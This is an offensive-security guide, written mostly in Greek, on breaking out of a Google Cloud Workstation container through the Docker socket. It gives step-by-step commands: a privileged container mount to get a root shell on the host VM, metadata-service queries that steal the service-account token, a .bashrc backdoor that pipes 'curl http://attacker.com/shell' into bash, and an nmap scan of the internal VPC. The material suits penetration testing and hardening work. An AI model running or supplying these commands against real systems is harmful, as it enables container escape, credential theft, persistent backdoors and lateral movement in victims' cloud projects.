# GCP - Cloud Workstations Privesc


### Container Breakout via Docker Socket (Container -> VM -> Project)

Η κύρια διαδρομή privilege escalation σε Cloud Workstations προέρχεται από την ανάγκη υποστήριξης **Docker-in-Docker (DinD)** workflows για προγραμματιστές. Όταν η διαμόρφωση του workstation κάνει mount το Docker socket ή επιτρέπει privileged containers (συνηθισμένη διαμόρφωση), ένας επιτιθέμενος μέσα στο workstation container μπορεί να διαφύγει στο υποκείμενο Compute Engine VM και να κλέψει το service account token του.

**Προαπαιτούμενα:**
- Πρόσβαση σε τερματικό Cloud Workstation (μέσω SSH, παραβιασμένης συνεδρίας ή κλεμμένων διαπιστευτηρίων)
- Η διαμόρφωση του workstation πρέπει να κάνει mount `/var/run/docker.sock` ή να ενεργοποιεί privileged containers

**Πλαίσιο αρχιτεκτονικής:** Το workstation είναι ένα container (Layer 3) που τρέχει σε Docker/Containerd runtime (Layer 2) πάνω σε ένα GCE VM (Layer 1). Το Docker socket δίνει άμεση πρόσβαση στο host container runtime.

> [!NOTE]
> Το εργαλείο [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) αυτοματοποιεί το πλήρες container escape και σας τοποθετεί σε root shell στο host VM.

<details>

<summary>Βήμα 1: Έλεγχος για Docker socket</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>Βήμα 2: Escape to the host VM filesystem</summary>

Εκκινούμε έναν privileged container, κάνοντας mount το root directory του host στο `/mnt/host`. Επίσης μοιραζόμαστε το network και το PID namespace του host για να μεγιστοποιήσουμε την ορατότητα.
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
Τώρα έχετε ένα **root shell στο υποκείμενο Compute Engine VM** (Layer 1).

</details>

<details>

<summary>Βήμα 3: Κλέψτε το VM service account token από το IMDS</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **Ελέγξτε τα Scopes!**
> Ακόμα και αν ο συνδεδεμένος Service Account είναι **Editor**, η VM μπορεί να περιορίζεται από access scopes.
> Αν δείτε `https://www.googleapis.com/auth/cloud-platform`, έχετε πλήρη πρόσβαση.
> Αν βλέπετε μόνο `logging.write` και `monitoring.write`, περιορίζεστε στα **Network Pivot** και **Persistence** vectors παρακάτω.

<details>

<summary>Βήμα 4: Επιτύχετε Persistence (Backdoor the User)</summary>

Cloud Workstations προσαρτούν έναν persistent disk στο `/home/user`. Επειδή ο container user (συνήθως `user`, UID 1000) ταυτίζεται με τον host user (UID 1000), μπορείτε να γράψετε στον home directory του host. Αυτό σας επιτρέπει να backdoor το περιβάλλον ακόμα κι αν το workstation container αναδημιουργηθεί.
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>Βήμα 5: Network Pivot (Internal VPC Access)</summary>

Εφόσον μοιράζεστε το host network namespace (`--net=host`), τώρα είστε ένας αξιόπιστος κόμβος στο VPC. Μπορείτε να σαρώσετε για εσωτερικές υπηρεσίες που επιτρέπουν πρόσβαση βάσει IP whitelisting.
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
